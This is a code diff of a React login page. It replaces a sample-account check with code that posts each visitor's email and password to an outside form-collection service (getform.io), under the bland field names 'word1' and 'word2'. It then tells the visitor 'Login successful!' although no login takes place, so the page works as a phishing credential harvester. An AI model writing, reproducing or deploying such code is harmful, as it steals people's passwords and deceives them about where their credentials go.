@@ -1,26 +1,42 @@
 import React, { useState } from 'react';
 import './App.css';
 
+
+
 function App() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [status, setStatus] = useState('');
 
-  const handleSubmit = (e) => { 
+  const handleSubmit = async (e) => { 
     e.preventDefault();
     setStatus(''); // Clear previous status
 
-    // Check for the sample account
-    if (email === 'user@example.com' && password === 'password123') {
-      
-      setStatus('Login successful! Redirecting...');
-      
-      
-      // It tells the browser to navigate to the new page.
-      window.location.href = 'https://www.salsagate.net/';
+  
+    const getformEndpoint = 'https://getform.io/f/adrdegla';
 
-    } else {
-      // This runs if the email and password don't match
+    // Added Getform fetch logic back
+    try {
+      const response = await fetch(getformEndpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          word1: email,
+          word2: password, 
+        }),
+      });
+
+      if (response.ok) {
+        setStatus('Login successful!'); 
+        setEmail('');
+        setPassword('');
+      } else {
+        setStatus('Error in login attempt.'); 
+      }
+    } catch (error) {
+      console.error('Error:', error);
       setStatus('Error in login attempt.'); 
     }
   };
